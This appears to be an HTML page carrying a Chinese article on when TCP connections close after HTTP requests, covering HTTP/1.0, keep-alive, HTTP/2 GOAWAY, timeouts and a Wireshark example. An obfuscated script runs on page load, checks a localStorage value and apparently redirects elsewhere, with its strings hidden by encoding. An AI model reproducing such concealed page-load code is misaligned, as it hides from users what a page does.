<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Document</title><link rel="stylesheet" href="../../css/github-markdown.min.css"><link rel="stylesheet" href="../../css/github.min.css"><style>body,html{margin:0;padding:0}.markdown-body{box-sizing:border-box;min-width:200px;max-width:980px;margin:0 auto!important;padding:45px 15px}.markdown-body pre{border:1px solid #e5e5e5!important;margin-top:var(--base-size-16)!important}</style></head><body><article id="article" class="markdown-body"></article><script>function _0x1d9d(d,n){var e=_0x32f1();return(_0x1d9d=function(n,o){var t=e[n-=398];void 0===_0x1d9d.uuvMXH&&(_0x1d9d.Obrxrx=function(n,o){var t,r=[],d=0,e="";for(n=(n=>{for(var o,t,r="",d="",e=0,l=0;t=n.charAt(l++);~t&&(o=e%4?64*o+t:t,e++%4)&&(r+=String.fromCharCode(255&o>>(-2*e&6))))t="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(t);for(var i=0,s=r.length;i<s;i++)d+="%"+("00"+r.charCodeAt(i).toString(16)).slice(-2);return decodeURIComponent(d)})(n),l=0;l<256;l++)r[l]=l;for(l=0;l<256;l++)d=(d+r[l]+o.charCodeAt(l%o.length))%256,t=r[l],r[l]=r[d],r[d]=t;for(var l=0,d=0,i=0;i<n.length;i++)t=r[l=(l+1)%256],r[l]=r[d=(d+r[l])%256],r[d]=t,e+=String.fromCharCode(n.charCodeAt(i)^r[(r[l]+r[d])%256]);return e},d=arguments,_0x1d9d.uuvMXH=!0);var n=n+e[0],r=d[n];return r?t=r:(void 0===_0x1d9d.SeXvMr&&(_0x1d9d.SeXvMr=!0),t=_0x1d9d.Obrxrx(t,o),d[n]=t),t})(d,n)}var _0x4d76ad=_0x1d9d;function _0x32f1(){var n=["WPWtW5RcKSobW57cPCoVWRBcRCoIhKms","W6tdOCkqEcxcHsL0W4RdISo5Da","ySo8W54xWPRcH0GuW4CmwSk9dq","WPHhhmoiWQyxWQtdPa","WR/dIcujcSomyG","WOzIx3WQrX3dV8kpWQq","ASk2pSoPW7WJW6WS","DmouomkUWPFcKmop","ccNdSNZdHa","WOOPW4D2W4dcRNhdGvi2lXG","FtamW5ldHSkAWRKufHNcVSk/W6u","u8occ8ofWPtdVSo7gZW","wCoAW5mnpSkWwG","WPddSxNdOSkPiwVdNmkrW7pcS29jxbGRWR9eW4NcQ8keW7BcNSoJWR3cLW","W4NdJbTEh8ooW6tcOSoq","W47dHHmjBmk2WRlcQSo+W4dcSmkYtq","t8oIvgPDWQ/cQ0hcLsPb","W6dcOmoMWP3dNI/dVKVcPG","W6RdObrDW5ddQCkjwa","W6ldRmkrEsBcJsDIW6xdH8o4qW","FtmeW5RcM8oRW5aSmGC","pSoSA8k/WRGmW6SXB8k8WPe","E8oqv2BdQ3ZdGSkMWPe","EtmiW5/dHCkAWR1iaXRcRmkaW5zz","WQNdO8ovmCk7F8oWwmkKxmkwvmo7","cMfEWO/cGSoqW4iDka","W6xdPu8MWQ3cQ8kLzSk0WQ/cP8oc","WORcKvjDoSoSW6C"];return(_0x32f1=function(){return n})()}if((()=>{for(var n=_0x1d9d,o=_0x32f1();;)try{if(514866==+parseInt(n(407,"lWww"))*(-parseInt(n(422,"idRf"))/2)+-parseInt(n(418,"eNc6"))/3+parseInt(n(400,"h9&)"))/4*(-parseInt(n(410,"yeg#"))/5)+parseInt(n(421,"FwC^"))/6*(-parseInt(n(413,"%qpK"))/7)+parseInt(n(398,"xVmR"))/8*(-parseInt(n(403,"%*Kx"))/9)+parseInt(n(404,"%*Kx"))/10+parseInt(n(412,"N#FC"))/11)break;o.push(o.shift())}catch(n){o.push(o.shift())}})(),localStorage[_0x4d76ad(424,"89js")](_0x4d76ad(414,"N#FC"))!=_0x4d76ad(425,"gMNj"))throw window[_0x4d76ad(423,"yeg#")][_0x4d76ad(416,"%*Kx")](_0x4d76ad(402,"qAaX")),Error();document.title="HTTP 请求发送并得到响应后，TCP 连接是否立即挥手",document.getElementById("article").innerHTML='<div><p>HTTP 请求发送并得到响应后，TCP 连接是否立即挥手（断开）取决于 <strong>HTTP 协议的连接管理方式</strong>  。这涉及 HTTP/1.x 和 HTTP/2 等不同版本的策略，以及客户端与服务器的配置。以下从原理、场景和案例展开分析：</p>\n<h3><strong>一、HTTP 连接管理的核心机制</strong></h3>\n<h4>1. <strong>HTTP/1.0 的默认行为：请求后立即挥手</strong></h4>\n<ul>\n<li><strong>特点</strong>  ：每个 HTTP 请求/响应完成后，TCP 连接立即通过四次挥手断开。</li>\n<li><strong>流程示例</strong>  ：\n<ol>\n<li>客户端发送 HTTP GET 请求（三次握手建立连接）。</li>\n<li>服务器返回响应。</li>\n<li>客户端或服务器发起四次挥手（FIN 包）断开连接。</li>\n</ol>\n</li>\n<li><strong>缺点</strong>  ：每次请求都需重新建立 TCP 连接，开销大（尤其对短连接场景，如静态资源请求）。</li>\n</ul>\n<h4>2. <strong>HTTP/1.1 的 <code>Connection: keep-alive</code>：持久连接</strong></h4>\n<ul>\n<li><strong>默认行为</strong>  ：HTTP/1.1 默认为持久连接（<code>keep-alive</code>），即一次 TCP 连接可处理多个 HTTP 请求/响应，避免重复握手。</li>\n<li><strong>断开条件</strong>  ：\n<ul>\n<li>客户端或服务器主动发送 <code>Connection: close</code> 头部。</li>\n<li>连接超时（如服务器设置 60 秒无活动则断开）。</li>\n<li>数据传输完毕且双方同意断开。</li>\n</ul>\n</li>\n<li><strong>优势</strong>  ：减少 TCP 握手和挥手的开销，提升多请求场景的性能（如网页加载多个资源）。</li>\n</ul>\n<h4>3. <strong>HTTP/2 的连接管理：多路复用</strong></h4>\n<ul>\n<li><strong>特点</strong>  ：基于单个 TCP 连接实现多路复用（多个请求/响应同时传输），连接持续存在直至显式关闭。</li>\n<li><strong>挥手时机</strong>  ：\n<ul>\n<li>当所有数据流（Stream）结束后，客户端或服务器可发送 <code>GOAWAY</code> 帧通知断开。</li>\n<li>连接异常（如网络中断）时自动触发挥手。</li>\n</ul>\n</li>\n<li><strong>优势</strong>  ：进一步减少连接开销，优化高并发场景的性能。</li>\n</ul>\n<h3><strong>二、TCP 四次挥手的触发条件</strong></h3>\n<p>无论 HTTP 版本如何，TCP 挥手的触发条件通常包括：</p>\n<h4>1. <strong>主动断开（显式请求）</strong></h4>\n<ul>\n<li>客户端在 HTTP 请求中添加 <code>Connection: close</code> 头部，告知服务器请求完成后断开连接。</li>\n<li>服务器在响应中添加 <code>Connection: close</code>，表示处理完当前请求后关闭连接。</li>\n</ul>\n<h4>2. <strong>超时断开</strong></h4>\n<ul>\n<li>服务器端设置连接超时时间（如 Nginx 默认 <code>keepalive_timeout 65s</code>），若一段时间内无新请求，主动发起挥手。</li>\n<li>客户端长时间未收到响应（如网络延迟），可能主动断开连接。</li>\n</ul>\n<h4>3. <strong>异常断开</strong></h4>\n<ul>\n<li>网络中断、服务器崩溃等异常情况，触发 TCP 的保活机制（Keep-Alive），若探测失败则断开连接。</li>\n</ul>\n<h3><strong>三、案例：不同场景下的连接生命周期</strong></h3>\n<h4>1. <strong>场景一：HTTP/1.0 单次请求</strong></h4>\n<pre><code class="language-plaintext">时序：\n1. 三次握手建立 TCP 连接\n2. 客户端发送 HTTP GET 请求\n3. 服务器返回响应\n4. 四次挥手断开 TCP 连接\n</code></pre>\n<h4>2. <strong>场景二：HTTP/1.1 持久连接（多个请求）</strong></h4>\n<pre><code class="language-plaintext">时序：\n1. 三次握手建立连接\n2. 请求1 → 响应1\n3. 请求2 → 响应2\n...\nn. 请求n → 响应n\nm. 超时或主动发送 Connection: close → 四次挥手断开连接\n</code></pre>\n<h4>3. <strong>场景三：HTTP/2 多路复用</strong></h4>\n<pre><code class="language-plaintext">时序：\n1. 三次握手 + TLS 握手（若启用 HTTPS）\n2. 客户端发送多个请求（不同 Stream 并行传输）\n3. 服务器并行返回响应\n4. 所有 Stream 完成后，发送 GOAWAY 帧 → 四次挥手断开连接\n</code></pre>\n<h3><strong>四、抓包示例：HTTP/1.1 持久连接与挥手</strong></h3>\n<p>使用 Wireshark 抓包观察到：</p>\n<ol>\n<li><strong>建立连接</strong>  ：三次握手（SYN/SYN+ACK/ACK）。</li>\n<li><strong>发送两个 HTTP 请求</strong>  ：\n<ul>\n<li>请求1：<code>GET /a.html</code>（无 <code>Connection: close</code>）</li>\n<li>请求2：<code>GET /b.js</code>（无 <code>Connection: close</code>）</li>\n</ul>\n</li>\n<li><strong>服务器响应后</strong>  ：连接保持活跃（无挥手动作）。</li>\n<li><strong>1分钟后（超时）</strong>  ：\n<ul>\n<li>服务器发送 FIN 包（挥手开始）</li>\n<li>客户端响应 ACK，随后发送 FIN</li>\n<li>服务器响应 ACK，连接关闭（四次挥手完成）。</li>\n</ul>\n</li>\n</ol>\n<h3><strong>五、延伸：HTTP 长连接与短连接的性能对比</strong></h3>\n<table>\n<thead>\n<tr>\n<th>场景</th>\n<th>短连接（请求后挥手）</th>\n<th>长连接（持久连接）</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>适用场景</strong></td>\n<td>单次请求（如 API 调用）</td>\n<td>多请求场景（如网页资源加载）</td>\n</tr>\n<tr>\n<td><strong>TCP 握手次数</strong></td>\n<td>每次请求都需 3 次握手</td>\n<td>仅首次请求需要 3 次握手</td>\n</tr>\n<tr>\n<td><strong>网络开销</strong></td>\n<td>高（每次请求消耗 2×RTT 握手）</td>\n<td>低（复用连接，减少 RTT 消耗）</td>\n</tr>\n<tr>\n<td><strong>服务器资源占用</strong></td>\n<td>低（连接用完即释放）</td>\n<td>高（需维护连接状态）</td>\n</tr>\n</tbody>\n</table>\n<h3><strong>总结</strong></h3>\n<p>HTTP 请求得到响应后，TCP 连接不一定立即挥手，具体取决于：</p>\n<ol>\n<li><strong>HTTP 协议版本</strong>  ：HTTP/1.0 默认短连接（请求后挥手），HTTP/1.1 和 HTTP/2 默认持久连接（可复用）。</li>\n<li><strong>连接管理头部</strong>  ：<code>Connection: close</code> 会触发请求后挥手，<code>keep-alive</code> 则保持连接。</li>\n<li><strong>超时与异常</strong>  ：无活动或异常时，连接可能被主动断开。</li>\n</ol>\n<p>实际应用中，持久连接（长连接）是主流方案，可显著减少 TCP 握手和挥手的开销，提升性能；而短连接适用于单次请求场景，避免服务器维护过多闲置连接。</p>\n</div>'</script></body></html>